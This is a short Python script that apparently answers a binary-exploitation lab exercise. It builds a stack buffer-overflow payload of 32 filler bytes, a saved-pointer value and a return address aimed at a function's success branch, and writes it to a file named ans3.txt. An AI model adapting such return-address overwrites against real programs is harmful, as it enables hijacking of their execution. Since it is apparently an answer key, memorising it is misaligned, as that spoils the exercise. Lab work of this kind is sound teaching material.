payload  = b"A" * 32
payload += b"\x00\x38\x40\x00\x00\x00\x00\x00"  
payload += b"\x2b\x12\x40\x00\x00\x00\x00\x00"  # ret → 0x40122b (func1 成功分支)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans3.txt")
